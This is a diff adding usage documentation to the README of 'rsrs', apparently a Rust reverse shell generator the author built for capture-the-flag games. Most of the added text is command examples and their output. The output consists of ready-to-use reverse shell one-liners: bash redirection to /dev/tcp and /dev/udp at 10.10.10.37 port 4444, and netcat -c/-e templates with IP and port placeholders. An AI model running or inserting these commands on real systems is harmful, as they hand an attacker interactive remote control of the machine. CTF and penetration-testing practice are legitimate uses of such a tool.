@@ -5,3 +5,44 @@ A reverse shell generator written in rust.
 I enjoy playing CTFs. There are reverse shell generators available on the web,
 but i wanted a single binary program that I could throw into containers and VMs
 easily, or just netcat across the wire to a target box.
+* Usage
+There are 3 subcommands. =Generate=, which generates a reverse shell,
+=list-shells= which lists the names of the reverse shells that were compiled in,
+and =list-shells-verbose= which lists shells, their components, and their
+capabilities.
+** Examples
+Generate a TCP Bash reverse shell that connects to port 4444 on the IP 10.10.10.37
+#+BEGIN_SRC
+rsrs generate -i 10.10.10.37 -p 4444 -r bash_tcp
+bash -i >& /dev/tcp/10.10.10.37/4444 0>&1
+#+END_SRC
+
+List all shells that run on Linux.
+#+BEGIN_SRC
+rsrs list-shells linux
+nc -c
+nc -e
+bash_tcp
+bash_udp
+#+END_SRC
+
+List all shells that run on linux, verbose.
+#+BEGIN_SRC
+rsrs list-shells-verbose linux
+Name:		bash_udp
+OS:		["linux", "mac"]
+Subcomponents:	["IP", "PORT"]
+Command:	bash -i >& /dev/udp/{SUBIP}/{SUBPORT} 0>&1
+Name:		nc -c
+OS:		["linux", "mac"]
+Subcomponents:	["IP", "PORT", "SHELL"]
+Command:	nc -c {SUBSHELL} {SUBIP} {SUBPORT}
+Name:		nc -e
+OS:		["linux", "mac"]
+Subcomponents:	["IP", "PORT", "SHELL"]
+Command:	nc -e {SUBSHELL} {SUBIP} {SUBPORT}
+Name:		bash_tcp
+OS:		["linux", "mac"]
+Subcomponents:	["IP", "PORT"]
+Command:	bash -i >& /dev/tcp/{SUBIP}/{SUBPORT} 0>&1
+#+END_SRC
